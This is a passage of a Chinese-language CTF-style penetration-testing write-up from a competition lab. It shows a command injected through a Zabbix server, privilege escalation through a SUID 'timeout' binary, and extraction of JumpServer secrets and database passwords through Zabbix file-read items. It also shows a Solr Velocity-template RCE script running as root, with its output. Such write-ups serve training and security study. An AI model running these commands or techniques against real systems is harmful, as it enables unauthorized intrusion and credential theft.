    root        10     2  0 14:15 ?        00:00:00 [lru-add-drain]
    root        11     2  0 14:15 ?        00:00:00 [watchdog/0]
    root        12     2  0 14:15 ?        00:00:00 [watchdog/1]
    root        13     2  0 14:15 ?        00:00:00 [migration/1]
    root        14     2  0 14:15 ?        00:00:00 [ksoftirqd/1]
    root        16     2  0 14:15 ?        00:00:00 [kworker/1:0H]
    root        18     2  0 14:15 ?        00:00:00 [kdevtmpfs]
    root        19     2  0 14:15 ?        00:00:00 [netns]
    root        20     2  0 14:15 ?        00:00:00 [khungtaskd]
    root        21     2  0 14:15 ?        00:00:00 [writeback]
    root        22     2  0 14:15 ?        00:00:00 [kintegrityd]
    root        23     2  0 14:15 ?        00:00:00 [bioset]
    root        24     2  0 14:15 ?        00:00:00 [bioset]
    root        25     2  0 14:15 ?        00:00:00 [bioset]
    root        26     2  0 14:15 ?        00:00:00 [kblockd]
    root        27     2  0 14:15 ?        00:00:00 [md]
    root        28     2  0 14:15 ?        00:00:00 [edac-poller]
    root        29     2  0 14:15 ?        00:00:00 [watchdogd]
    root        35     2  0 14:15 ?        00:00:00 [kswapd0]
    root        36     2  0 14:15 ?        00:00:00 [ksmd]
    root        37     2  0 14:15 ?        00:00:00 [khugepaged]
    root        38     2  0 14:15 ?        00:00:00 [crypto]
    root        46     2  0 14:15 ?        00:00:00 [kthrotld]
    root        47     2  0 14:15 ?        00:00:00 [kworker/u4:1]
    root        48     2  0 14:15 ?        00:00:00 [kmpath_rdacd]
    root        49     2  0 14:15 ?        00:00:00 [kaluad]
    root        50     2  0 14:15 ?        00:00:00 [kworker/1:1]
    root        52     2  0 14:15 ?        00:00:00 [kpsmoused]
    root        53     2  0 14:15 ?        00:00:00 [kworker/1:2]
    root        54     2  0 14:15 ?        00:00:00 [ipv6_addrconf]
    root        67     2  0 14:15 ?        00:00:00 [deferwq]
    root       131     2  0 14:15 ?        00:00:00 [kauditd]
    root       199     2  0 14:15 ?        00:00:00 [rpciod]
    root       200     2  0 14:15 ?        00:00:00 [xprtiod]
    root       263     2  0 14:15 ?        00:00:00 [kworker/u4:2]
    root       267     2  0 14:15 ?        00:00:00 [ata_sff]
    root       275     2  0 14:15 ?        00:00:00 [scsi_eh_0]
    root       276     2  0 14:15 ?        00:00:00 [scsi_tmf_0]
    root       277     2  0 14:15 ?        00:00:00 [kworker/0:1H]
    root       279     2  0 14:15 ?        00:00:00 [scsi_eh_1]
    root       280     2  0 14:15 ?        00:00:00 [scsi_tmf_1]
    root       292     2  0 14:15 ?        00:00:00 [bioset]
    root       293     2  0 14:15 ?        00:00:00 [xfsalloc]
    root       294     2  0 14:15 ?        00:00:00 [xfs_mru_cache]
    root       295     2  0 14:15 ?        00:00:00 [xfs-buf/vda1]
    root       296     2  0 14:15 ?        00:00:00 [xfs-data/vda1]
    root       297     2  0 14:15 ?        00:00:00 [xfs-conv/vda1]
    root       298     2  0 14:15 ?        00:00:00 [xfs-cil/vda1]
    root       299     2  0 14:15 ?        00:00:00 [xfs-reclaim/vda]
    root       300     2  0 14:15 ?        00:00:00 [xfs-log/vda1]
    root       301     2  0 14:15 ?        00:00:00 [xfs-eofblocks/v]
    root       302     2  0 14:15 ?        00:00:01 [xfsaild/vda1]
    root       303     2  0 14:15 ?        00:00:00 [kworker/1:1H]
    root       400     1  0 14:15 ?        00:00:00 /usr/lib/systemd/systemd-journald
    root       433     1  0 14:15 ?        00:00:00 /usr/lib/systemd/systemd-udevd
    root       467     2  0 14:15 ?        00:00:00 [hwrng]
    root       479     1  0 14:15 ?        00:00:00 /sbin/auditd
    root       526     2  0 14:15 ?        00:00:00 [kvm-irqfd-clean]
    root       531     2  0 14:15 ?        00:00:00 [ttm_swap]
    root       552     1  0 14:15 ?        00:00:00 /usr/sbin/irqbalance --foreground
    rpc        553     1  0 14:15 ?        00:00:00 /sbin/rpcbind -w
    root       555     1  0 14:15 ?        00:00:00 php-fpm: master process (/etc/opt/rh/rh-php72/php-fpm.conf)
    root       556     1  0 14:15 ?        00:00:00 /usr/bin/qemu-ga --method=virtio-serial --path=/dev/virtio-ports/org.qemu.guest_agent.0 --blacklist=guest-file-open,guest-file-close,guest-file-read,guest-file-write,guest-file-seek,guest-file-flush,guest-exec,guest-exec-status -F/etc/qemu-ga/fsfreeze-hook
    root       559     1  0 14:15 ?        00:00:00 /usr/sbin/rsyslogd -n
    root       562     1  0 14:15 ?        00:00:00 /usr/lib/systemd/systemd-logind
    polkitd    563     1  0 14:15 ?        00:00:00 /usr/lib/polkit-1/polkitd --no-debug
    dbus       564     1  0 14:15 ?        00:00:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
    root       576     1  0 14:15 ?        00:00:00 /usr/bin/python2 -Es /usr/sbin/tuned -l -P
    root       581     1  0 14:15 ?        00:00:00 /usr/sbin/sshd -D
    chrony     594     1  0 14:15 ?        00:00:00 /usr/sbin/chronyd
    zabbix     604     1  0 14:15 ?        00:00:00 /usr/sbin/zabbix_agentd -c /etc/zabbix/zabbix_agentd.conf
    zabbix     612   604  0 14:15 ?        00:00:00 /usr/sbin/zabbix_agentd: collector [idle 1 sec]
    zabbix     613   604  0 14:15 ?        00:00:00 /usr/sbin/zabbix_agentd: listener #1 [waiting for connection]
    zabbix     614   604  0 14:15 ?        00:00:00 /usr/sbin/zabbix_agentd: listener #2 [waiting for connection]
    zabbix     615   604  0 14:15 ?        00:00:00 /usr/sbin/zabbix_agentd: listener #3 [waiting for connection]
    zabbix     616   604  0 14:15 ?        00:00:00 /usr/sbin/zabbix_agentd: active checks #1 [idle 1 sec]
    root       623     1  0 14:15 ?        00:00:00 /usr/sbin/gssproxy -D
    root       648     1  0 14:15 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    apache     655   555  0 14:15 ?        00:00:00 php-fpm: pool www
    apache     656   555  0 14:15 ?        00:00:00 php-fpm: pool www
    apache     657   555  0 14:15 ?        00:00:00 php-fpm: pool www
    apache     659   555  0 14:15 ?        00:00:00 php-fpm: pool www
    root       660     1  0 14:15 tty1     00:00:00 /sbin/agetty --noclear tty1 linux
    apache     661   555  0 14:15 ?        00:00:00 php-fpm: pool www
    apache     664   555  0 14:15 ?        00:00:05 php-fpm: pool zabbix
    apache     665   555  0 14:15 ?        00:00:06 php-fpm: pool zabbix
    root       672     1  0 14:15 ?        00:00:00 /usr/sbin/crond -n
    apache     673   555  0 14:15 ?        00:00:05 php-fpm: pool zabbix
    apache     676   555  0 14:15 ?        00:00:05 php-fpm: pool zabbix
    apache     677   555  0 14:15 ?        00:00:05 php-fpm: pool zabbix
    root       680     1  0 14:15 ttyS0    00:00:00 /sbin/agetty --keep-baud 115200,38400,9600 ttyS0 vt220
    mysql      691     1  0 14:15 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe --basedir=/usr
    apache     777   648  0 14:15 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    apache     778   648  0 14:15 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    apache     782   648  0 14:15 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    mysql      959   691  0 14:15 ?        00:00:16 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log --pid-file=/var/run/mariadb/mariadb.pid --socket=/var/lib/mysql/mysql.sock
    root       990     1  0 14:15 ?        00:00:00 /usr/libexec/postfix/master -w
    postfix    991   990  0 14:15 ?        00:00:00 pickup -l -t unix -u
    postfix    992   990  0 14:15 ?        00:00:00 qmgr -l -t unix -u
    zabbix    1176     1  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server -c /etc/zabbix/zabbix_server.conf
    zabbix    1183  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: configuration syncer [synced configuration in 0.041190 sec, idle 60 sec]
    zabbix    1188  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: alert manager #1 [sent 0, failed 0 alerts, idle 5.004719 sec during 5.004815 sec]
    zabbix    1189  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: alerter #1 started
    zabbix    1190  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: alerter #2 started
    zabbix    1192  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: alerter #3 started
    zabbix    1193  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: preprocessing manager #1 [queued 0, processed 7 values, idle 5.001578 sec during 5.001778 sec]
    zabbix    1194  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: preprocessing worker #1 started
    zabbix    1195  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: preprocessing worker #2 started
    zabbix    1196  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: preprocessing worker #3 started
    zabbix    1197  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: lld manager #1 [processed 0 LLD rules, idle 5.002123sec during 5.002194 sec]
    zabbix    1198  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: lld worker #1 [processed 1 LLD rules, idle 1534.422826 sec during 1534.485957 sec]
    zabbix    1199  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: lld worker #2 [processed 1 LLD rules, idle 3089.100561 sec during 3089.433959 sec]
    zabbix    1200  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: housekeeper [deleted 21259 hist/trends, 0 items/triggers, 0 events, 0 sessions, 0 alarms, 0 audit items, 0 records in 4.599678 sec, idle for 1 h
    zabbix    1201  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: timer #1 [updated 0 hosts, suppressed 0 events in 0.000441 sec, idle 59 sec]
    zabbix    1203  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: http poller #1 [got 0 values in 0.000817 sec, idle 5 sec]
    zabbix    1205  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: discoverer #1 [processed 0 rules in 0.000404 sec, idle 60 sec]
    zabbix    1207  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: history syncer #1 [processed 0 values, 0 triggers in 0.000024 sec, idle 1 sec]
    zabbix    1208  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: history syncer #2 [processed 0 values, 0 triggers in 0.000013 sec, idle 1 sec]
    zabbix    1209  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: history syncer #3 [processed 0 values, 0 triggers in 0.000021 sec, idle 1 sec]
    zabbix    1210  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: history syncer #4 [processed 1 values, 0 triggers in 0.008000 sec, idle 1 sec]
    zabbix    1211  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: escalator #1 [processed 0 escalations in 0.001004 sec, idle 3 sec]
    zabbix    1212  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: proxy poller #1 [exchanged data with 0 proxies in 0.000038 sec, idle 5 sec]
    zabbix    1213  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: self-monitoring [processed data in 0.000025 sec, idle 1 sec]
    zabbix    1215  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: task manager [processed 0 task(s) in 0.000201 sec, idle 5 sec]
    zabbix    1216  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: poller #1 [got 0 values in 0.000185 sec, idle 1 sec]
    zabbix    1219  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: poller #2 [got 0 values in 0.000028 sec, idle 1 sec]
    zabbix    1221  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: poller #3 [got 1 values in 0.000427 sec, idle 1 sec]
    zabbix    1222  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: poller #4 [got 0 values in 0.000028 sec, idle 1 sec]
    zabbix    1223  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: poller #5 [got 0 values in 0.000021 sec, idle 1 sec]
    zabbix    1224  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: unreachable poller #1 [got 0 values in 0.000015 sec, idle 5 sec]
    zabbix    1226  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: trapper #1 [processed data in 0.000280 sec, waiting for connection]
    zabbix    1228  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: trapper #2 [processed data in 0.001824 sec, waiting for connection]
    zabbix    1229  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: trapper #3 [processing data]
    zabbix    1230  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: trapper #4 [processed data in 0.000252 sec, waiting for connection]
    zabbix    1234  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: trapper #5 [processed data in 0.000352 sec, waiting for connection]
    zabbix    1235  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: icmp pinger #1 [got 0 values in 0.000017 sec, idle 5 sec]
    zabbix    1236  1176  0 14:15 ?        00:00:00 /usr/sbin/zabbix_server: alert syncer [queued 0 alerts(s), flushed 0 result(s) in 0.000829 sec, idle 1 sec]
    apache    1365   648  0 14:26 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    apache    1366   648  0 14:26 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    apache    1394   648  0 14:29 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    apache    1395   648  0 14:29 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    apache    1396   648  0 14:29 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    apache    1413   555  0 14:30 ?        00:00:05 php-fpm: pool zabbix
    apache    1686   648  0 14:50 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    root      1844     2  0 14:56 ?        00:00:00 [kworker/0:2]
    root      1966     1  0 15:01 ?        00:00:00 /usr/sbin/anacron -s
    apache    2012   555  0 15:01 ?        00:00:02 php-fpm: pool zabbix
    root      2023     2  0 15:02 ?        00:00:00 [kworker/0:0]
    apache    2030   555  0 15:02 ?        00:00:02 php-fpm: pool zabbix
    apache    2034   648  0 15:02 ?        00:00:00 /usr/sbin/httpd -DFOREGROUND
    root      2365     2  0 15:12 ?        00:00:00 [kworker/0:1]
    zabbix    2427  1229  0 15:15 ?        00:00:00 sh -c id; whoami; ps -ef; ls -al /root; cat /root/flag; case $? in [01]) true;; *) false;; esac
    zabbix    2430  2427  0 15:15 ?        00:00:00 ps -ef
    ls: cannot open directory /root: Permission denied
    cat: /root/flag: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>弹 shell，然后借助 suid 权限提权，拿 flag</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bash-4.2$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/timeout
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/sbin/mount.nfs
/usr/sbin/fping
/usr/sbin/fping6
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper

bash-4.2$ <span class="token function">timeout</span> <span class="token number">1</span> <span class="token function">cat</span> /root/flag
<span class="token function">timeout</span> <span class="token number">1</span> <span class="token function">cat</span> /root/flag
flag<span class="token punctuation">{</span>RdboeEj0Xml3D9KSCOyigYIansFJ8LVW<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="flag3-192-168-33-149-JumpServer-开源堡垒机"><a href="#flag3-192-168-33-149-JumpServer-开源堡垒机" class="headerlink" title="flag3 192.168.33.149 JumpServer 开源堡垒机"></a>flag3 192.168.33.149 JumpServer 开源堡垒机</h3><p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/9b16f108-36f6-4835-997f-55789031141c.png"></p>
<p><strong>不是</strong> 之前那个 jumpserver 远程命令执行RCE漏洞</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1502/">https://paper.seebug.org/1502/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Skactor/jumpserver_rce">https://github.com/Skactor/jumpserver_rce</a> 打不通</p>
<p><strong>先上线 zabbix</strong></p>
<p><a target="_blank" rel="noopener" href="http://192.168.33.127/zabbix/hosts.php">http://192.168.33.127/zabbix/hosts.php</a></p>
<p>克隆个 Zabbix server 模板，然后直接改 ip 成 192.168.33.149</p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/393096aa-1cb6-4b9c-966e-c4f47bb2ff60.png"></p>
<p><strong>参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/OwSZWCshBKJW0b5du7Juhw">Zabbix与Jumpserver后渗透小记</a></strong></p>
<p>弹了 zabbix server shell 连上去，发现这机器上面没有 zabbix_get。。</p>
<p>不过好在后台可以执行，在 配置-主机-监控项 里面，直接搜 <code>vfs.file</code></p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/a6dbc0be-e8cd-4411-85bd-e3ababf5686f.png"></p>
<p>然后 clone 一个</p>
<p>发现不在 <code>/etc/zabbix/zabbix_agentd.conf</code></p>
<p>而是</p>
<pre class="line-numbers language-none"><code class="language-none">vfs.file.contents[/opt/jumpserver/config/config.txt]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/9c3ed791-c2c4-4fef-a762-3aff5c110ad1.png"></p>
<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/f28a443d-9242-4783-abfa-7224aafc84ef.png"></p>
<pre class="line-numbers language-none"><code class="language-none"># JumpServer configuration file example.
#
# 如果不了解用途可以跳过修改此配置文件, 系统会自动填入
# 完整参数文档 https://docs.jumpserver.org/zh/master/admin-guide/env/

################################## 镜像配置 ###################################
#
# 国内连接 docker.io 会超时或下载速度较慢, 开启此选项使用华为云镜像加速
# 取代旧版本 DOCKER_IMAGE_PREFIX
#
# DOCKER_IMAGE_MIRROR=1

################################## 安装配置 ###################################
#
# JumpServer 数据库持久化目录, 默认情况下录像、任务日志都在此目录
# 请根据实际情况修改, 升级时备份的数据库文件(.sql)和配置文件也会保存到该目录
#
VOLUME_DIR=/data/jumpserver

# 加密密钥, 迁移请保证 SECRET_KEY 与旧环境一致, 请勿使用特殊字符串
# (*) Warning: Keep this value secret.
# (*) 勿向任何人泄露 SECRET_KEY
#
SECRET_KEY=MjcxMzE5ZjYtZTE4YS0xMWVkLTk5MDYtYWMxZjZiZGYyOTM0

# 组件向 core 注册使用的 token, 迁移请保持 BOOTSTRAP_TOKEN 与旧环境一致,
# 请勿使用特殊字符串
# (*) Warning: Keep this value secret.
# (*) 勿向任何人泄露 BOOTSTRAP_TOKEN
#
BOOTSTRAP_TOKEN=MjcxMzE5ZjYtZTE4YS0xMWVk

# 日志等级 INFO, WARN, ERROR
#
LOG_LEVEL=ERROR

# JumpServer 容器使用的网段, 请勿与现有的网络冲突, 根据实际情况自行修改
#
DOCKER_SUBNET=192.168.250.0/24

# ipv6 nat, 正常情况下无需开启
# 如果宿主不支持 ipv6 开启此选项将会导致无法获取真实的客户端 ip 地址
#
USE_IPV6=0
DOCKER_SUBNET_IPV6=fc00:1010:1111:200::/64

################################# MySQL 配置 ##################################
# 外置 MySQL 需要输入正确的 MySQL 信息, 内置 MySQL 系统会自动处理
#
DB_HOST=mysql
DB_PORT=3306
DB_USER=root
DB_PASSWORD=MjcxMzE5ZjYtZTE4YS0xMWVkLT
DB_NAME=jumpserver

################################# Redis 配置 ##################################
# 外置 Redis 需要请输入正确的 Redis 信息, 内置 Redis 系统会自动处理
#
REDIS_HOST=redis
REDIS_PORT=6379
REDIS_PASSWORD=MjcxMzE5ZjYtZTE4YS0xMWVkLT

################################## 访问配置 ###################################
# 对外提供服务端口, 如果与现有服务冲突请自行修改
# 如果不想对外提供访问可以使用 127.0.0.1:&lt;port&gt;, eg: 127.0.0.1:33060
#
HTTP_PORT=80
SSH_PORT=2222
MAGNUS_PORTS=30000-30100

################################# HTTPS 配置 #################################
# 参考 https://docs.jumpserver.org/zh/master/admin-guide/proxy/ 配置
#
# USE_LB=1
# HTTPS_PORT=443
# SERVER_NAME=your_domain_name
# SSL_CERTIFICATE=your_cert
# SSL_CERTIFICATE_KEY=your_cert_key
#
CLIENT_MAX_BODY_SIZE=4096m

################################## 组件配置 ###################################
# 组件注册使用, 默认情况下向 core 容器注册, 集群环境需要修改为集群 vip 地址
#
CORE_HOST=http://core:8080

# Task 配置, 是否启动 jms_celery 容器, 单节点必须开启
#
USE_TASK=1

# XPack 包, 企业版本自动开启, 开源版本设置无效
#
RDP_PORT=3389

# Core Session 定义,
# SESSION_COOKIE_AGE 表示闲置多少秒后 session 过期,
# SESSION_EXPIRE_AT_BROWSER_CLOSE=true 表示关闭浏览器即 session 过期
#
# SESSION_COOKIE_AGE=86400
SESSION_EXPIRE_AT_BROWSER_CLOSE=True

# Lion 开启字体平滑, 优化体验
#
JUMPSERVER_ENABLE_FONT_SMOOTHING=True

################################## 其他配置 ##################################
# 终端使用宿主 HOSTNAME 标识, 首次安装自动生成
#
SERVER_HOSTNAME=IDSS

# 当前运行的 JumpServer 版本号, 安装和升级完成后自动生成
#
CURRENT_VERSION=v2.27.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>拿到</p>
<p><code>SECRET_KEY=MjcxMzE5ZjYtZTE4YS0xMWVkLTk5MDYtYWMxZjZiZGYyOTM0</code><br><code>BOOTSTRAP_TOKEN=MjcxMzE5ZjYtZTE4YS0xMWVk</code></p>
<p>先利用  <code>BOOTSTRAP_TOKEN</code> 读取 assess_key 和 secret </p>
<p>然后借助 jumpserver 的 API 去执行命令 RCE</p>
<p><strong>但是做到这里比赛结束了，寄！</strong></p>
<p>（然后通宵打了两天，顶不住，随便整理了一下做出来的部分的 wp 直接交平台上就呼呼了，累累</p>
<p>（然而靶场就关了，后面也复现不起来了</p>
<p>后面的步骤应该还是参考 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/OwSZWCshBKJW0b5du7Juhw">Zabbix与Jumpserver后渗透小记</a> 这篇文章来</p>
<p>不过赛后和其他师傅聊了下，说再后面还有个 VMware ESXi，要用 log4j 打，但这玩意不是想象中的那么好日，摸了（</p>
<h2 id="漏洞挖掘场景4-2-x2F-3"><a href="#漏洞挖掘场景4-2-x2F-3" class="headerlink" title="漏洞挖掘场景4 [2/3]"></a>漏洞挖掘场景4 [2/3]</h2><pre class="line-numbers language-none"><code class="language-none">10.103.31.38:22 open
10.103.31.38:8983 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle:http://10.103.31.38:8983  code:302 len:0      title:None 跳转url: http://10.103.31.38:8983/solr/
[*] WebTitle:http://10.103.31.38:8983/solr/ code:200 len:14543  title:Solr Admin
[+] http://10.103.31.38:8983 poc-yaml-solr-cve-2019-0193
[+] http://10.103.31.38:8983 poc-yaml-solr-velocity-template-rce<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2023/05/30/Pentest_2023ShanghaiPanshixingdong/8ea9a5b0-ba3c-4c65-b92f-e49fd8510ca6.png"></p>
<h3 id="flag1-192-168-33-39-apache-solr"><a href="#flag1-192-168-33-39-apache-solr" class="headerlink" title="flag1 192.168.33.39 apache_solr"></a>flag1 192.168.33.39 apache_solr</h3><p><a target="_blank" rel="noopener" href="https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template/tree/master">https://github.com/AleWong/Apache-Solr-RCE-via-Velocity-template/tree/master</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ python apache_solr_exec.py <span class="token number">10.103</span>.31.38 <span class="token number">8983</span>
OS Realese: Linux, OS Version: <span class="token number">3.10</span>.0-1160.80.1.el7.x86_64
<span class="token keyword">if</span> remote <span class="token builtin class-name">exec</span> failed, you should change your <span class="token builtin class-name">command</span> with right os platform

Init <span class="token function">node</span> test1 Successfully, <span class="token builtin class-name">exec</span> <span class="token assign-left variable">command</span><span class="token operator">=</span>whoami
RCE Successfully @Apache Solr <span class="token function">node</span> test1
  root

Init <span class="token function">node</span> test2 Successfully, <span class="token builtin class-name">exec</span> <span class="token assign-left variable">command</span><span class="token operator">=</span>whoami
RCE Successfully @Apache Solr <span class="token function">node</span> test2
  root

Init <span class="token function">node</span> test3 Successfully, <span class="token builtin class-name">exec</span> <span class="token assign-left variable">command</span><span class="token operator">=</span>whoami
RCE Successfully @Apache Solr <span class="token function">node</span> test3
  root

Init <span class="token function">node</span> test4 Successfully, <span class="token builtin class-name">exec</span> <span class="token assign-left variable">command</span><span class="token operator">=</span>whoami
RCE Successfully @Apache Solr <span class="token function">node</span> test4
  root

Init <span class="token function">node</span> test5 Successfully, <span class="token builtin class-name">exec</span> <span class="token assign-left variable">command</span><span class="token operator">=</span>whoami
RCE Successfully @Apache Solr <span class="token function">node</span> test5
  root
  
<span class="token comment"># ls -al /root</span>
RCE Successfully @Apache Solr <span class="token function">node</span> test1
  total <span class="token number">52</span>
dr-xr-x---.  <span class="token number">4</span> root root  <span class="token number">216</span> May <span class="token number">20</span> <span class="token number">23</span>:25 <span class="token builtin class-name">.</span>
dr-xr-xr-x. <span class="token number">17</span> root root  <span class="token number">263</span> May <span class="token number">20</span> <span class="token number">23</span>:25 <span class="token punctuation">..</span>
-rw-------.  <span class="token number">1</span> root root <span class="token number">6880</span> Nov <span class="token number">11</span>  <span class="token number">2022</span> anaconda-ks.cfg
-rw-------   <span class="token number">1</span> root root   <span class="token number">76</span> May <span class="token number">12</span> 06:40 .bash_history
-rw-r--r--.  <span class="token number">1</span> root root   <span class="token number">18</span> Dec <span class="token number">29</span>  <span class="token number">2013</span> .bash_logout
-rw-r--r--.  <span class="token number">1</span> root root  <span class="token number">176</span> Dec <span class="token number">29</span>  <span class="token number">2013</span> .bash_profile
-rw-r--r--.  <span class="token number">1</span> root root  <span class="token number">176</span> Dec <span class="token number">29</span>  <span class="token number">2013</span> .bashrc
-rw-r--r--.  <span class="token number">1</span> root root  <span class="token number">100</span> Dec <span class="token number">29</span>  <span class="token number">2013</span> .cshrc
-rw-r--r--   <span class="token number">1</span> root root   <span class="token number">38</span> May <span class="token number">20</span> <span class="token number">23</span>:25 flag
-rw-------.  <span class="token number">1</span> root root <span class="token number">6587</span> Nov <span class="token number">11</span>  <span class="token number">2022</span> original-ks.cfg
drwxr-xr-x   <span class="token number">9</span> root root  <span class="token number">201</span> May  <span class="token number">4</span> 09:02 solr-7.7.2
drwx------.  <span class="token number">2</span> root root   <span class="token number">29</span> Apr <span class="token number">12</span> <span class="token number">10</span>:03 .ssh
-rw-r--r--.  <span class="token number">1</span> root root  <span class="token number">129</span> Dec <span class="token number">29</span>  <span class="token number">2013</span> .tcshrc
